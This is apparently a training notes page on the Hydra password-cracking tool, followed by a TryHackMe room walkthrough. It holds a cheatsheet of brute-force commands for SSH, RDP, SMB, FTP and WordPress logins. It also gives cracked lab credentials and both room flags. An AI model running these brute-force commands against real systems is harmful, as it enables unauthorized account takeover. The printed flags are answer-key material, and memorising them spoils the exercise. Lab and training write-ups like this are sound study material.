---
description: https://www.kali.org/tools/hydra/ https://tryhackme.com/room/hydra
---

# 🐉 Hydra

## What is Hydra?

Hydra is a popular open-source password cracking tool that can be used to perform brute-force attacks on login credentials of various network protocols, including FTP, HTTP, SSH, Telnet, and others. It uses different attack methods, including dictionary attacks, brute-force attacks, and hybrid attacks, to guess passwords and gain unauthorized access to a system.

Hydra can be used to test the strength of passwords used in network systems and identify potential vulnerabilities that may be exploited by attackers. It is often used by security professionals, network administrators, and penetration testers as a tool to assess the security of their systems and identify weaknesses that need to be addressed.

According to its [official repository](https://github.com/vanhauser-thc/thc-hydra), Hydra supports, i.e., has the ability to brute force the following protocols: “Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP.”

## Installing Hydra

If you prefer to use the Kali machine, Hydra also comes pre-installed, as is the case with all Kali distributions.

However, you can check its official repositories if you prefer to use another Linux distribution. For instance, you can install Hydra on an Ubuntu or Fedora system by executing `apt install hydra` or `dnf install hydra`. Furthermore, you can download it from its official [THC-Hydra repository](https://github.com/vanhauser-thc/thc-hydra).

## Cheatsheet

The following table uses the $ip variable which can be set with the following command:

`export ip 10.10.10.2`

| Command                                                                                                                                      | Description                                          |
| -------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| hydra -P password-file.txt -v $ip snmp                                                                                                       | Hydra brute force against SNMP                       |
| hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp                                                                          | Hydra FTP known user and rockyou password list       |
| hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh                                                                                 | Hydra SSH using list of users and passwords          |
| hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh                                                                                            | Hydra SSH using a known password and a username list |
| hydra $ip -s 22 ssh -l -P big\_wordlist.txt                                                                                                  | Hydra SSH Against Known username on port 22          |
| hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V                                                                             | Hydra POP3 Brute Force                               |
| hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V                                                                                            | Hydra SMTP Brute Force                               |
| hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin                                                                                    | Hydra attack http get 401 login with a dictionary    |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip                                                              | Hydra attack Windows Remote Desktop with rockyou     |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb                                                                | Hydra brute force SMB user with rockyou:             |
| hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^\&pwd=^PASS^\&wp-submit=Log In\&testcookie=1:S=Location' | Hydra brute force a Wordpress admin login            |
| hydra -L usernames.txt -P passwords.txt $ip smb -V -f                                                                                        | SMB Brute Forcing                                    |
| hydra -L users.txt -P passwords.txt $ip ldap2 -V -f                                                                                          | LDAP Brute Forcing                                   |

## Example of usage

### SSH

`hydra -l <username> -P <full path to pass> 10.10.44.136 -t 4 ssh`

| Option | Description                            |
| ------ | -------------------------------------- |
| `-l`   | specifies the (SSH) username for login |
| `-P`   | indicates a list of passwords          |
| `-t`   | sets the number of threads to spawn    |

For example, `hydra -l root -P passwords.txt 10.10.44.136 -t 4 ssh` will run with the following arguments:

* Hydra will use `root` as the username for `ssh`
* It will try the passwords in the `passwords.txt` file
* There will be four threads running in parallel as indicated by `-t 4`

### Post Web Form

We can use Hydra to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser’s network tab (in developer tools) to see the request types or view the source code.

`sudo hydra <username> <wordlist> 10.10.44.136 http-post-form "<path>:<login_credentials>:<invalid_response>"`

| Option                | Description                                                                              |
| --------------------- | ---------------------------------------------------------------------------------------- |
| `-l`                  | the username for (web form) login                                                        |
| `-P`                  | the password list to use                                                                 |
| `http-post-form`      | the type of the form is POST                                                             |
| `<path>`              | the login page URL, for example, `login.php`                                             |
| `<login_credentials>` | the username and password used to log in, for example, `username=^USER^&password=^PASS^` |
| `<invalid_response>`  | part of the response when the login fails                                                |
| `-V`                  | verbose output for every attempt                                                         |

Below is a more concrete example Hydra command to brute force a POST login form:

`hydra -l <username> -P <wordlist> 10.10.44.136 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

* The login page is only `/`, i.e., the main IP address.
* The `username` is the form field where the username is entered
* The specified username(s) will replace `^USER^`
* The `password` is the form field where the password is entered
* The provided passwords will be replacing `^PASS^`
* Finally, `F=incorrect` is a string that appears in the server reply when the login fails

## Room THM

### Task 1 - Use Hydra to bruteforce molly's web password. What is flag 1?

Go to website: 10.10.226.238:80

<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 17-53-28.png" alt=""><figcaption></figcaption></figure>

and try to login with "default" credentials: admin:password.

We use Burp Suite and Foxy Proxy to intercept traffic and request:

<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 17-55-16.png" alt=""><figcaption></figcaption></figure>

After this, we turn off Foxy Proxy and retry to login with the same credentials:

<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 17-10-46.png" alt=""><figcaption></figcaption></figure>

The form and parameters to use with Hydra for Post-Web-Form are:

```bash
sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.226.238 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
```

* user (-l): molly
* wordlist (-P): /usr/share/wordlists/rockyou.txt
* IP: 10.10.226.238
* method: http-post-form "/login:username=^USER^\&password=^PASS^:
* error message: Your username or password is incorrect."

```bash
sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.226.238 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
```

<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 18-05-24.png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
molly:sunshine
{% endhint %}

We can login using them and finding flag1.

<details>

<summary>🚩 Flag 1</summary>

THM{2673a7dd116de68e85c48ec0b1f2612e}

</details>

### Task 2 - Use Hydra to bruteforce molly's SSH password. What is flag 2?

The form and parameters to use with Hydra for SSH are:

```bash
sudo hydra -l <username> -P <full path to pass> $IP -t 4 ssh
```

* user (-l): molly
* wordlist (-P): /usr/share/wordlists/rockyou.txt
* IP: 10.10.226.238
* port: ssh

```bash
sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.226.238 ssh
```

<figure><img src="../.gitbook/assets/Schermata del 2023-07-08 18-06-05.png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
molly:butterfly
{% endhint %}

We can login with ssh using them and finding flag2.

```bash
ssh molly@10.10.226.238
molly@10.10.226.238's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
32 updates are security updates.


Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
molly@ip-10-10-226-238:~$ ls -l
total 4
-rw-rw-r-- 1 molly molly 38 Dec 17  2019 flag2.txt
molly@ip-10-10-226-238:~$ cat flag2.txt
```

<details>

<summary>🚩 Flag 2</summary>

THM{c8eeb0468febbadea859baeb33b2541b}

</details>
